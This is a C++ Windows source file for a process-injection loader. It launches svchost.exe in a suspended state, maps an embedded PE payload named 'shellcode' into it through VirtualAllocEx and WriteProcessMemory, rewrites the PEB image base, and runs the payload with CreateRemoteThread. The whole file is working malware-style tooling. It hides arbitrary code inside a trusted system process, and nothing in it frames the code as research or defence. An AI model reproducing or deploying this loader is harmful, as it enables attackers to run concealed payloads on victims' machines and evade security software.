#include <iostream>
#include <Windows.h>
#include <fstream>
#include <filesystem>
#include <string>
#include <strsafe.h>

#include "hdr/shellcode.h"
#include "hdr/logger.h"


int main() {
    Logger::Init("Logger", FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY,
        FOREGROUND_GREEN | FOREGROUND_BLUE,
        FOREGROUND_GREEN | FOREGROUND_INTENSITY,
        FOREGROUND_RED,
        FOREGROUND_RED | FOREGROUND_GREEN
    );

    PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)shellcode;
    PIMAGE_NT_HEADERS64 NtHeader = (PIMAGE_NT_HEADERS64)(shellcode + DosHeader->e_lfanew);

    PROCESS_INFORMATION pi;
    STARTUPINFO si = { sizeof(si) };

    ULONG_PTR retlen;
    PROCESS_BASIC_INFORMATION pbi;
    void* newImgBase;
    DWORD64 ImgBaseAddress;

    HMODULE ntDll = LoadLibraryA("ntdll.dll");
    if (ntDll == nullptr) {
        LOG_ERROR("Failed to load ntDll");
        return 1;
    }
    NTQUERYINFOPROC64 NtQueryInformationProcess = (NTQUERYINFOPROC64)GetProcAddress(ntDll, "NtQueryInformationProcess");

    if (NtHeader->Signature != IMAGE_NT_SIGNATURE) {
        LOG_ERROR("Signature mismatch");
        return 1;
    }

    if (!CreateProcess("C:\\Windows\\System32\\svchost.exe",
        NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED,
        NULL, NULL, &si, &pi)) {

        LOG_ERROR("CreateProcess failed: %lu", GetLastError());
        return 1;
    }

    NtQueryInformationProcess(
        pi.hProcess,
        ProcessBasicInformation,
        &pbi,
        sizeof(PROCESS_BASIC_INFORMATION),
        &retlen
    );

    newImgBase = VirtualAllocEx(
        pi.hProcess,
        NULL,
        NtHeader->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (newImgBase == NULL) {
        LOG_ERROR("VirtualAllocEx failed: %lu", GetLastError());
        return 1;
    }

    WriteProcessMemory(pi.hProcess, newImgBase, shellcode, NtHeader->OptionalHeader.SizeOfHeaders, 0);

    PIMAGE_SECTION_HEADER SectionHeader = (PIMAGE_SECTION_HEADER)(shellcode + DosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS64));

    for (int num = 0; num < NtHeader->FileHeader.NumberOfSections; num++) {
        if (!WriteProcessMemory(pi.hProcess,
            (LPVOID)((DWORD64)newImgBase + SectionHeader->VirtualAddress),
            (LPVOID)((DWORD64)shellcode + SectionHeader->PointerToRawData),
            SectionHeader->SizeOfRawData,
            0)) {
            LOG_ERROR("Failed to write section: %lu", GetLastError());
        }
        SectionHeader++;
    }

    ImgBaseAddress = (DWORD64)pbi.PebBaseAddress + 0x10;
    if (!WriteProcessMemory(pi.hProcess, (LPVOID)ImgBaseAddress, &newImgBase, sizeof(newImgBase), 0)) {
        LOG_ERROR("Failed to write ImgBaseAddress: %lu", GetLastError());
    }

    HANDLE NewThread = CreateRemoteThread(pi.hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)((DWORD64)newImgBase + NtHeader->OptionalHeader.AddressOfEntryPoint),
        NULL,
        CREATE_SUSPENDED,
        NULL);

    if (!NewThread) {
        LOG_ERROR("Failed to create thread");
        return 1;
    }

    SuspendThread(pi.hThread);
    ResumeThread(NewThread);



    LOG_SUCCESS("DosHeader: 0x%p", DosHeader);
    LOG_SUCCESS("DosHeader: 0x%p", NtHeader);
    LOG_SUCCESS("Shellcode injected successfully");

    FreeLibrary(ntDll);
    std::cin.get();
    return 0;
}